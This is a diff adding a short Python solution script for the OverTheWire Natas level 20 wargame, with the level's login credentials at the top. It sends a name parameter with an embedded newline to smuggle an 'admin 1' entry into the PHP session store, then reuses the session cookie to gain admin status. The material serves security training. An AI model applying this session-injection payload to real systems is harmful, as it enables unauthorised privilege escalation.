@@ -1,0 +1,18 @@
+natas20:guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
+
+import requests
+
+url = 'http://natas20.natas.labs.overthewire.org'
+auth = ('natas20', 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH')
+
+params = dict(name='admin\nadmin 1', debug='')
+
+cookies = dict()
+r = requests.get(url, auth=auth, params=params, cookies=cookies)
+phpsessid = r.cookies['PHPSESSID']
+print(r.text)
+
+params = dict(debug='')
+cookies = dict(PHPSESSID=phpsessid)
+r = requests.get(url, auth=auth, params=params, cookies=cookies)
+print(r.text)
